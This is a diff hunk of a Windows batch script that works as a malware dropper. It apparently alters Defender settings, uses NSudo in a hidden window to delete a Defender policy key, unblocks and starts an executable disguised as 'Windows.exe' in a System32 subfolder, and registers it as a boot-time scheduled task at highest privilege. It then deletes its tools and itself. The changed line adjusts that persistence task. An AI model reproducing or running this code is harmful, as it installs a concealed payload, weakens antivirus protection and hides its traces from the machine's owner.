@@ -16,7 +16,7 @@ powershell -inputformat none -outputformat none -NonInteractive -Command "Add-Mp
 NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f
 powershell -Command "Unblock-file '%systemroot%\System32\Windowsexe\Windows.exe'"
 start "Windows.exe" "%systemroot%\System32\Windowsexe\Windows.exe"
-SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows.exe" /RU "SYSTEM" /TN "Windows.exe" /RL HIGHEST
+SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows.exe" /TN "Windows.exe" /RL HIGHEST
 del NSudo.exe
 call :deleteSelf&exit
 :deleteSelf
